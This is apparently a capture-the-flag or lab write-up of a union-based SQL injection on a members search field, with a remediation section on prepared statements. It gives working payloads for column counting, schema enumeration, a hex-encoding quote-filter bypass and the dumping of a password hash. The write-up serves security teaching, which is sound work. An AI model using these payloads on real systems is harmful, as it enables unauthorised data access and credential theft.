## Exploitation Process

1. Input a single quote (`'`) into the `Search member by ID` field on the Members page to test for vulnerability.
   
   **Output:**
   ```text
   You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1
   ```
    *This confirms the database is MariaDB and input is directly concatenated into the query.*

2. Determine the number of columns in the current SELECT statement using UNION.

    ```sql
    1 UNION SELECT 1, 2
    ```
    *The numbers 1 and 2 appear on the screen, confirming 2 columns.*

3. Retrieve table names from the database system table.

    ```sql
    1 UNION SELECT table_name, 1 FROM information_schema.tables
    ```
    *Found tables: `db_default`, `users`, `guestbook`, `list_images`, `vote_dbs`*

4. Retrieve column names from the `users` table.

    ```sql
    5 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name='users'
    ```

    **Output:**
   ```text
   You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'users\'' at line 1
   ```
   *Syntax error, likely due to a filter escaping quotes.*

5. Encode the string "users" into hexadecimal: `0x7573657273`.

    ```sql
    5 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name=0x7573657273
    ```

    *Found columns `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire` and `countersign`.*

6. Extract the content of `Commentaire` and `countersign` columns.

    ```sql
    5 UNION SELECT Commentaire, countersign FROM users
    ```

    **Result:**
   - **Commentaire:** `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
   - **countersign (MD5):** `5ff9d0165b4f92b14994e5c685cdce28`

## Definitions

**SQL Injection (SQLi)** A vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It allows viewing data that is not normally retrieved (like passwords).

**Union-Based SQLi** A technique that uses the `UNION` SQL operator to combine the results of the original query with the results of a new query injected by the attacker. This allows extracting data from other tables.

**Hexadecimal Encoding Bypass** A technique used to bypass security filters that block quotes (`'` or `"`). Since SQL databases understand Hexadecimal values (e.g., `0x75...`) as strings, attackers use them to write string literals without using quotes.

## How to Fix

### Use Prepared Statements (Parameterized Queries)

This is the most effective defense. Never concatenate user input directly into SQL strings. Use placeholders (e.g., `?` or `:id`) instead. The database engine treats parameters as data, not executable code.

**Vulnerable (PHP):**
```php
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

**Secure (PHP PDO):**
```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $id]);
```